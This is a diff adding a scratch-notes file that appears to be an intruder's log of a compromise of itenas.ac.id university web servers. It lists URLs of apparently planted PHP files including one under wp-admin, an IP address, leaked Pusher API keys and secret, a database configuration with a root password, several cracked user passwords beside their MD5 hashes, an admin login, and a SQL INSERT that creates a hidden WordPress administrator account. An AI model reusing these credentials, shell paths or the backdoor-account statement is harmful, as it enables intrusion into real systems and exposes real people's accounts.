@@ -1,0 +1,54 @@
+c0-f8-da-8d-8a-db
+
+http://if-lab.itenas.ac.id/eoffice/upload/profil/yy.php
+http://if-lab.itenas.ac.id/yy.php
+
+app_id = "865726"
+key = "03390b8b7160498ec7dc"
+secret = "2019924890ffdf16030d"
+cluster = "ap1"
+
+spesific
+spesific2
+taroh 
+
+http://kemahasiswaan.itenas.ac.id/beasiswa/administrator/index.php/welcome/bagongers
+
+http://kemahasiswaan.itenas.ac.id/wp-admin/w00t.php
+36.71.236.101
+// The following values will probably need to be changed.
+$db['default']['username'] = "root";
+$db['default']['password'] = "T42ngk4l4n";
+$db['default']['database'] = "db_beasiswa";
+
+// The following values can probably stay the same.
+$db['default']['hostname'] = "localhost";
+$db['default']['dbdriver'] = "mysqli";
+$db['default']['dbprefix'] = "";
+$db['default']['pconnect'] = TRUE;
+$db['default']['db_debug'] = TRUE;
+$db['default']['cache_on'] = FALSE;
+$db['default']['cachedir'] = "";
+$db['default']['char_set'] = "utf8";
+$db['default']['dbcollat'] = "utf8_general_ci";
+
+$active_group = "default";
+$active_record = TRUE;
+
+Found : juheri
+password: juheri
+(hash = 86f5d55832b5df3bef1dc5c72d30c3a3)
+
+Found : dadang
+password: dadang
+(hash = 0037bb978d51e84d1ad5478e85430f26)
+dasd
+usr: admin_all
+pss:123
+
+Found : asep
+password : asep
+(hash = dc855efb0dc7476760afaa1b281665f1)
+
+http://kemahasiswaan.itenas.ac.id/wp-admin/
+insert into bkweb.wp_bkusers (ID,user_login , user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) values('4','akunk','$1$Mj4Mj6n9$XAn9jw.95ae6QxTKXsYk30','akunk','akunk@itenas.ac.id','http://itenas.ac.id','2018-04-06 02:11:27','1568638599:$1$Mj4Mj6n9$XAn9jw.95ae6QxTKXsYk30','admin','admin');
